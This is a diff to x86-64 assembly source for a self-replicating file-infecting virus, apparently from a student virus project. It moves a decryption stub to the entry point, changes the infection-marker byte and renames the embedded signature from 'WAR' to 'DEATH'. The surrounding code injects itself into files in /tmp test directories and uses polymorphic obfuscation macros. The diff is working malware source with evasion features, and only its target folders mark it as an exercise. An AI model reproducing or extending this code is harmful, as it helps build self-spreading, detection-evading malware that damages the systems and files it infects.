@@ -6,6 +6,13 @@ global  _start                              ;must be declared for linker (ld)
 _start:   ;Entry-Point
 PUSH
 
+.OUI:
+jmp .enc_start
+;DECYPHER
+
+
+
+.enc_start:
 mov rbp, rsp
 sub rbp, famine_size  ; reserve famine_size bytes on the stack
 OBF_POLY_1
@@ -104,7 +111,7 @@ jne _exx_pop
 	mov rdi, r14
 	mov rax, _close
 	syscall
-	jmp .OUI
+	jmp .ok
 
 
 .read_file:
@@ -263,13 +270,8 @@ nop
 	OBF_POP_RDI
 	jmp _exx_pop
 
-.OUI:
-jmp .enc_start
-;DECYPHER
 
-
-
-.enc_start:
+.ok:
 
 ;DUREX BLOCK HERE  BETWEEN .DUREX AND .SKIP_DUREX
 .durex:
@@ -617,7 +619,7 @@ inject_self:
 	mov r13, STACK(famine.file_data)
 	add r13, rax
 	sub r13, BEGIN_SIGNATURE_OFFSET_FORM_END
-	cmp byte[r13], 'W'
+	cmp byte[r13], 'D'
 	je .return_pop
 
 	; get delta  ( address at execution time)
@@ -1062,7 +1064,7 @@ poly_inc_r10:	inc r10
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 enc_end:
 	db 0
-signature		db			0x00, 'WAR      - version 99.0 (c)oded by <araout>42424242', 0x0, 0xa
+signature		db			0x00, 'DEATH    - version 99.0 (c)oded by <araout>42424242', 0x0, 0xa
 forbidden		db			"test.out", 0
 famine_entry	dq			_start
 random			db			"/dev/urandom",0,0
